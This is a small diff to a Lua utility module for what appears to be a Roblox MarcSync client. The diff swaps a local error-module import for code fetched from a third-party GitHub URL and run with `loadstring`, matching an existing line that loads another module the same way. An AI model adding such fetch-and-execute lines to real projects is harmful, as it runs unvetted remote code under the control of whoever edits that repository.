@@ -1,5 +1,5 @@
 local AuthorizationError = require("@Errors/Authorization")
-local CollectionError = require("@Errors/Collection")
+local CollectionError = loadstring(game:HttpGet("https://raw.githubusercontent.com/1makam1/Main/refs/heads/main/MarcSync/Objects/Collection.lua"))()
 local EntryError = loadstring(game:HttpGet("https://raw.githubusercontent.com/1makam1/Main/refs/heads/main/MarcSync/Objects/Entry.lua"))()
 
 local HttpService = game:GetService("HttpService")
@@ -79,5 +79,6 @@ function utils.makeHTTPRequest(type: string, method: string, url: string, body: 
 end
 
 return utils
+
 
 
